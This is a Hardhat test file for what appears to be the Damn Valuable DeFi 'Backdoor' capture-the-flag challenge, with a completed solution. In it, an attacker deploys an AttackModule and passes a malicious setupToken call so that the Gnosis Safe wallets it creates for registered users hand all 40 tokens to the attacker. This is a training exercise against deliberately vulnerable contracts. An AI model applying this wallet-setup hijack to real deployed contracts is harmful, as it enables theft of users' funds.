const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, attacker;

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Deploy the registry
        this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            this.masterCopy.address,
            this.walletFactory.address,
            this.token.address,
            users
        );

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.true;            
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        // 1. Create a new wallet with owners [alice, attacker] 
        // 2. Initiase wallet with backdoor module which allows 0 signature interactions
        // 3. Once created, verify wallet has 10 tokens
        // 4. Execute transaction on module contract to transfer tokens to attacker
        // 5. Repeat x4

        const attackerToken = this.token.connect(attacker);
        const attackerFactory = this.walletFactory.connect(attacker);
        const attackerMasterCopy = this.masterCopy.connect(attacker);
        const attackerWalletRegistry = this.walletRegistry.connect(attacker);

        // Helper Function
        const checkTokenBalance = async (address, name) => {
            const tokenBal = await attackerToken.balanceOf(address);

            console.log(`TOKEN Balance of ${name}`, ethers.utils.formatEther(tokenBal));
        }

        await checkTokenBalance(attacker.address, "Attacker");

        // Deploy attacking contract
        const AttackModuleFactory = await ethers.getContractFactory("AttackModule", attacker);
        const attackModule = await AttackModuleFactory.deploy(
            attacker.address,
            attackerFactory.address,
            attackerMasterCopy.address,
            attackerWalletRegistry.address,
            attackerToken.address
        );
        console.log("Deployed attacking module at", attackModule.address);

        // ABI call to setupToken() which is malicious
        const moduleABI = ["function setupToken(address _tokenAddress, address _attacker)"];
        const moduleIFace = new ethers.utils.Interface(moduleABI);
        const setupData = moduleIFace.encodeFunctionData("setupToken", [
            attackerToken.address, 
            attackModule.address
        ])

        // Do exploit in one transaction (after contract deployment)
        await attackModule.exploit(users, setupData);
          
        await checkTokenBalance(attacker.address, "Attacker");

    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i]);
            
            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");

            // User is no longer registered as a beneficiary
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Attacker must have taken all tokens
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
